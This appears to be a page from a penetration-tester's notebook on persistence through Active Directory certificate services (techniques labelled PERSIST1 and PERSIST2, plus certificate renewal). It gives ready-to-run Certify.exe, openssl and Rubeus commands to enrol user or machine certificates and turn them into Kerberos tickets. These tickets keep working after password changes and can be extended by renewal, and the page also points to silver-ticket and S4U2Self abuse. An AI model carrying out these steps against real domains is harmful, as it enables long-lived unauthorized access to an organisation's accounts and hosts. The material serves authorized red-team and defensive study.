# Certificates

### <mark style="color:orange;">User Persistence (PERSIST1)</mark> <a href="#user-persistence-persist-1" id="user-persistence-persist-1"></a>

Find certificate templates available for enrollment for the current user:

```
Cmd > .\Certify.exe find /clientauth
```

Search for any template that allows domain authentication (a stock published template that allows client authentication is the `User` template).

Request a new certificate for enrolling current user context:

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
```

This will output a certificate and private key in `.pem`. To convert it to `.pfx` compatible with Rubeus do:

```
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

After that an adversary can upload it to target and use Rubeus to request a valid TGT, for as long as the certificate is valid (default certificate lifetime is one year):

```
Cmd > .\Rubeus.exe asktgt /user:snovvcrash /certificate:C:\Temp\cert.pfx /password:Passw0rd!
```

This approach will work _even if the user changes their password_. Combined with the **THEFT5** technique, an adversary can also persistently obtain the account's NTLM hash.

### <mark style="color:orange;">Machine Persistence (PERSIST2)</mark> <a href="#machine-persistence-persist-2" id="machine-persistence-persist-2"></a>

Same as for **PERSIST1** but requesting a certificate for enrolling current machine context:

```
 # While elevated
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:Machine /machine
```

With access to a machine account certificate an adversary can use S4U2Self to obtain a Kerberos ticket to any service on the host (see [RBCD Abuse](file:///mnt/5658F7A858F78551/PROGS/LINUX/DOCS/note/sites/notebook/ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse.html#resource-based-constrained-delegation-rbcd)) or generate a silver ticket.

### <mark style="color:orange;">Certificate Renewal</mark> <a href="#certificate-renewal" id="certificate-renewal"></a>

* Certificate template **validity period** - determines how long an issued certificate can be used.
* Certificate template **renewal period** - determines a window of time _before the certificate expires_ where an account can renew it from the issuing certificate authority.

An adversary can renew the compromised certificate before the validity period expires, and so that extend their access to AD without requesting additional ticket enrollments.
